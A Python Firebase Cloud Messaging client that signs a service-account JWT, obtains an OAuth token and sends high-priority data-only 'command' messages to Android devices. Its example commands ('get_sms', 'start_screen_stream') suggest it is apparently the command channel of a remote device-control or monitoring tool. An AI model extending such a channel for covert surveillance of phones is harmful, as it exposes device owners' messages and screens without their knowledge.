"""
FCM Client (Firebase Cloud Messaging) — HTTP v1 API.

Uses the Service Account JSON to obtain OAuth 2.0 access tokens and send
data-only messages to devices via the FCM HTTP v1 API.

Google deprecated the legacy "Server Key" approach. The HTTP v1 API requires:
  POST https://fcm.googleapis.com/v1/projects/{project_id}/messages:send
  Authorization: Bearer <oauth2_access_token>

The access token is obtained by signing a JWT with the service account's
private key and exchanging it at Google's OAuth 2.0 token endpoint.
"""

import json
import time
import logging
import asyncio
import aiohttp
import base64
import os

logger = logging.getLogger("fcm")

# ─── Configuration ────────────────────────────────────────────
SERVICE_ACCOUNT_PATH = os.environ.get(
    "FCM_SERVICE_ACCOUNT_PATH",
    os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                 "credentials", "firebase-admin-sdk.json")
)

# Cached credentials + token
_service_account_data = None
_access_token = None
_token_expires_at = 0


def _load_service_account():
    """Load and cache the service account JSON."""
    global _service_account_data
    if _service_account_data is None:
        try:
            with open(SERVICE_ACCOUNT_PATH, "r") as f:
                _service_account_data = json.load(f)
            logger.info(f"FCM: Loaded service account for project {_service_account_data.get('project_id')}")
        except Exception as e:
            logger.warning(f"FCM: Could not load service account from {SERVICE_ACCOUNT_PATH}: {e}")
            _service_account_data = {}
    return _service_account_data


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _create_jwt(sa: dict) -> str:
    """Create a signed JWT for OAuth 2.0 token exchange using RS256."""
    import hashlib

    header = {
        "alg": "RS256",
        "typ": "JWT",
        "kid": sa.get("private_key_id", "")
    }

    now = int(time.time())
    payload = {
        "iss": sa.get("client_email", ""),
        "scope": "https://www.googleapis.com/auth/firebase.messaging",
        "aud": "https://oauth2.googleapis.com/token",
        "exp": now + 3600,
        "iat": now
    }

    # Encode header and payload
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")

    # Sign with RSA private key
    private_key_pem = sa.get("private_key", "")
    if not private_key_pem:
        raise ValueError("No private_key in service account")

    # Use cryptography library for RSA signing
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding

    private_key = serialization.load_pem_private_key(
        private_key_pem.encode(),
        password=None
    )
    signature = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    signature_b64 = _b64url_encode(signature)

    return f"{header_b64}.{payload_b64}.{signature_b64}"


async def _get_access_token() -> str:
    """Get a valid OAuth 2.0 access token, refreshing if necessary."""
    global _access_token, _token_expires_at

    # Return cached token if still valid (with 60s buffer)
    if _access_token and time.time() < _token_expires_at - 60:
        return _access_token

    sa = _load_service_account()
    if not sa or not sa.get("private_key"):
        logger.warning("FCM: No service account available — cannot get access token")
        return ""

    try:
        jwt_token = await asyncio.get_event_loop().run_in_executor(None, _create_jwt, sa)

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
            async with session.post(
                "https://oauth2.googleapis.com/token",
                data={
                    "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                    "assertion": jwt_token
                }
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    _access_token = data.get("access_token", "")
                    _token_expires_at = time.time() + data.get("expires_in", 3600)
                    logger.info("FCM: Obtained new OAuth 2.0 access token")
                    return _access_token
                else:
                    body = await resp.text()
                    logger.error(f"FCM: Token exchange failed ({resp.status}): {body[:200]}")
                    return ""
    except Exception as e:
        logger.error(f"FCM: Error getting access token: {e}")
        return ""


async def send_fcm_command(
    device_token: str,
    command_name: str,
    command_id: str = "",
    params: dict = None,
    device_id: str = ""
) -> bool:
    """Send a data-only FCM message to a device via HTTP v1 API.

    Args:
        device_token: The device's FCM registration token
        command_name: The command to execute (e.g. "get_sms", "start_screen_stream")
        command_id: The command ID for tracking
        params: Command parameters
        device_id: The device ID

    Returns:
        True if sent successfully, False otherwise
    """
    if not device_token:
        logger.debug("FCM: No device token — skipping")
        return False

    sa = _load_service_account()
    project_id = sa.get("project_id", "")
    if not project_id:
        logger.warning("FCM: No project_id in service account")
        return False

    access_token = await _get_access_token()
    if not access_token:
        logger.warning("FCM: No access token — cannot send FCM")
        return False

    # Build the FCM v1 message (data-only, high priority for Android)
    message = {
        "message": {
            "token": device_token,
            "data": {
                "command": command_name,
                "command_id": command_id,
                "device_id": device_id,
                "params": json.dumps(params or {}, ensure_ascii=False),
                "timestamp": str(int(time.time() * 1000))
            },
            "android": {
                "priority": "high",
                "data": {
                    "command": command_name,
                    "command_id": command_id,
                    "device_id": device_id,
                    "params": json.dumps(params or {}, ensure_ascii=False),
                    "timestamp": str(int(time.time() * 1000))
                }
            }
        }
    }

    url = f"https://fcm.googleapis.com/v1/projects/{project_id}/messages:send"

    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
            async with session.post(
                url,
                headers={
                    "Authorization": f"Bearer {access_token}",
                    "Content-Type": "application/json"
                },
                json=message
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    logger.info(f"FCM: Sent '{command_name}' to device {device_id[:16]}... — name={data.get('name', '')}")
                    return True
                else:
                    body = await resp.text()
                    logger.error(f"FCM: Send failed ({resp.status}): {body[:300]}")
                    return False
    except Exception as e:
        logger.error(f"FCM: Error sending message: {e}")
        return False


def is_fcm_available() -> bool:
    """Check if FCM is available (service account loaded)."""
    sa = _load_service_account()
    return bool(sa and sa.get("private_key") and sa.get("project_id"))

async def close():
    """Cleanup (no-op — sessions are created per-call)."""
    pass
